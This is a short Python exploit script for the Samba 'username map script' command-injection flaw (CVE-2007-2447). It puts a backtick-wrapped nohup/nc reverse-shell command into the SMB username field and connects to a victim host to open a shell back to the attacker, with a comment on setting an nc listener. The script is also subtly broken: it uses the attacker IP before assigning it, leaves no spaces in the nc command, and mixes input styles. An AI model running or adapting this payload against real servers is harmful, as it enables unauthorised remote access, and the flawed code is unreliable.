#!/usr/bin/python

#Rewrited in Python by v1nc3 
#Exploit for CVE-2007-2447 ('Username' map script command execution). 
#Developed for exploiting 'CVE-2007-2447' without Metasploit-Framework
#For Samba smbd 3.x - 4.x

import smb
from smb.SMBConnection import SMBConnection



#set a listener on the attacker machine, ex. nc -nvlp 1234
reverse_shell = 'nc' + attacker_ip + "1234"

attacker_ip = input("Set YOUR ip: ") #for delivery a reverse shell
victim_ip = raw_input("Set victim ip: ") 
victim_port = input("Set victim port: ")

print("[+] Samba exploit started...")
 

username = '/=`nohup ' + reverse_shell + "`" #payload
password = 'password'

#establish connection
conn = SMBConnection(username, password, "OH-NO!", "OH-NO!", use_ntlm_v2=False)

assert conn.connect(victim_ip, victim_port)

conn.close()
